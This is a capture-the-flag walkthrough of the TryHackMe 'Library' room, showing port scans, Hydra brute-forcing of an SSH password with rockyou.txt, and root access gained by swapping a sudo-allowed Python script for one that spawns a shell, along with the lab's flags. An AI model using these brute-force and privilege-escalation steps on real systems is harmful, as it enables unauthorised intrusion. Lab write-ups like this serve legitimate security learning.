
# Library

Room: [https://tryhackme.com/room/bsidesgtlibrary](https://tryhackme.com/room/bsidesgtlibrary)

## Reconnaissance

First, I verified that the target was reachable and performed a full port scan using RustScan.

```bash
rustscan -a 10.49.183.254 -r 1-65535
```

The scan revealed two open ports:

```text
22/tcp
80/tcp
```

I then performed service enumeration using Nmap.

```bash
nmap -sC -sV -p22,80 10.49.183.254
```

Results:

```text
22/tcp  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp  Apache 2.4.18 (Ubuntu)
```

The web server had the title:

```text
Welcome to Blog - Library Machine
```

So I started enumerating the web application. 

---

## Web Enumeration

I used Gobuster to discover hidden directories and files.

```bash
gobuster dir -u http://10.49.183.254/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Interesting results included:

```text
images/
index.html
robots.txt
```

I also enumerated the `images` directory:

```bash
gobuster dir -u http://10.49.183.254/images/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

No additional interesting files were discovered there. 

---

## Credential Discovery

The `robots.txt` file contained an unusual entry:

```text
User-agent: rockyou
Disallow: /
```

I initially tested the specified User-Agent:

```bash
curl -H 'User-Agent: rockyou' http://10.49.183.254/
```

The page itself did not change, but the website source contained a username.

The blog post was written by:

```text
meliodas
```

There were also comments from:

```text
root
www-data
Anonymous
```

The username `meliodas` was particularly interesting because SSH was running on the target. 

The `robots.txt` contents were:

```text
User-agent: rockyou
Disallow: /
```

This suggested that the RockYou password wordlist could be relevant. 

I therefore attempted SSH password brute-forcing against the discovered username using `rockyou.txt`.

```bash
hydra -l meliodas -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://10.49.183.254 -t 4
```

Hydra successfully found the password:

```text
meliodas : iloveyou1
```

The result was:

```text
[22][ssh] host: 10.49.183.254 login: meliodas password: iloveyou1
```



---

## Initial Access

Using the discovered credentials, I connected to the target through SSH.

```bash
ssh meliodas@10.49.183.254
```

The SSH connection was successful and I obtained a shell as `meliodas`.

```text
meliodas@ubuntu:~$
```



I checked the home directory:

```bash
ls
```

It contained:

```text
bak.py
user.txt
```

The user flag was:

```bash
cat user.txt
```

```text
6d488cbb3f111d135722c33cb635f4ec
```



---

## Privilege Escalation

Next, I checked the sudo permissions of the current user.

```bash
sudo -l
```

The important entry was:

```text
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

This meant `bak.py` could be executed as **root** using Python without requiring a sudo password. 

I inspected the script:

```bash
cat /home/meliodas/bak.py
```

The original script was:

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

The file itself was owned by root:

```bash
ls -l /home/meliodas/bak.py
```

```text
-rw-r--r-- 1 root root 353 Aug 23 2019 /home/meliodas/bak.py
```

So I could not directly modify the file. 

However, because the file was located in my home directory, I was able to remove the existing file and create a replacement.

```bash
rm bak.py
```

After confirming the deletion, I created a new `bak.py` containing:

```python
import os
os.system("/bin/bash")
```

The resulting file was therefore under my control. 

I first tested the script normally:

```bash
/usr/bin/python3 /home/meliodas/bak.py
```

and remained as:

```text
meliodas
```

This was expected because the script was not being executed with elevated privileges.

I then executed the same script through the sudo permission discovered earlier:

```bash
sudo /usr/bin/python3 /home/meliodas/bak.py
```

This spawned a root shell:

```text
root@ubuntu:~#
```

I confirmed the privileges:

```bash
whoami
```

```text
root
```



Finally, I read the root flag:

```bash
cat /root/root.txt
```

```text
e8c8c6c256c35515d1d344ee0488c617
```




